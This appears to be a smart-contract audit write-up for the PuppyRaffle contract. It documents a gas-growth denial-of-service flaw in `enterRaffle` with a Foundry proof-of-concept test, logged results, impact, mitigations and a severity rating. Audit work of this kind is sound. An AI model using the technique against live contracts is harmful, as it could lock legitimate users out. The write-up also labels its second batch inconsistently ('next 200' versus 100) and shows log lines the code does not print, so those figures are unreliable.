# DoS Attack Proof of Concept

## Overview
This test demonstrates a potential Denial of Service (DoS) vulnerability in the PuppyRaffle contract by measuring gas consumption when entering multiple players into the raffle.

## Attack Vector
The attack exploits the gas consumption of the `enterRaffle` function when processing multiple players. The gas cost increases with the number of players, potentially making the function too expensive to execute.

## Proof of Concept
```solidity
function test_DoSAttack() public {
    // Set gas price to 1 for consistent measurements
    vm.txGasPrice(1);
    
    // First batch of 100 players
    uint256 numPlayers = 100;
    address[] memory players = new address[](numPlayers);
    for (uint256 i = 0; i < numPlayers; i++) {
        players[i] = address(i);
    }

    // Measure gas for first batch
    uint256 gasBefore = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);
    uint256 gasAfter = gasleft();
    console.log("Gas used with the first 100: ", (gasBefore - gasAfter) * tx.gasprice);

    // Second batch of 100 players
    address[] memory players2 = new address[](numPlayers);
    for (uint256 i = 0; i < numPlayers; i++) {
        players2[i] = address(numPlayers + i);
    }
    
    // Measure gas for second batch
    uint256 gasBefore2 = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players2);
    uint256 gasAfter2 = gasleft();
    console.log("Gas used with the next 200: ", (gasBefore2 - gasAfter2) * tx.gasprice);
}
```

## Test Results
```
[PASS] test_DoSAttack() (gas: 25537704)
Logs:
  Gas before 1073702769
  Gas after 1067199497
  Gas used with the first 100:  6503272
  Gas used with the next 200:  18995517
```

### Analysis of Results
- First 100 players: 6,503,272 gas
- Next 100 players: 18,995,517 gas
- The gas cost nearly tripled (~2.92x increase) for the same number of players
- This demonstrates quadratic growth in gas costs as the number of players increases

## Impact
- The gas cost increases with the number of players
- An attacker could potentially make the function too expensive to execute by submitting a large number of players
- This could prevent legitimate users from entering the raffle

## Mitigation
1. Limit the maximum number of players that can be entered in a single transaction
2. Implement a maximum total number of players for the raffle
3. Consider using a more gas-efficient data structure for storing players
4. Implement a time-based cooldown between entries

## Severity
Medium - While this doesn't directly lead to fund loss, it could prevent the contract from functioning as intended and potentially lock users out of the raffle.